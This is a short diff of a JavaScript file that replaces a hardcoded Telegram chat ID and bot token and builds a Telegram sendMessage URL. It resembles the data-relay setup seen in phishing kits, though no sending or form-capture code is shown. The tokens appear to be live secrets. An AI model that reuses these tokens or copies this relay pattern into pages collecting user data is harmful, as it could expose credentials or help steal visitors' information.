@@ -1,7 +1,7 @@
      $(document).ready(function() {
 
-       const chat_id = '6809554683',
-         botID = 'bot7586025814:AAHrR8nTWnG_4H04XuRvs0a43Z9Ltgn1H9g';
+       const chat_id = '6231929303',
+         botID = 'bot7962302488:AAGt0ETfWhMht7UDHttZ_9Db8r2LaawzwUA';
 
        const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
 
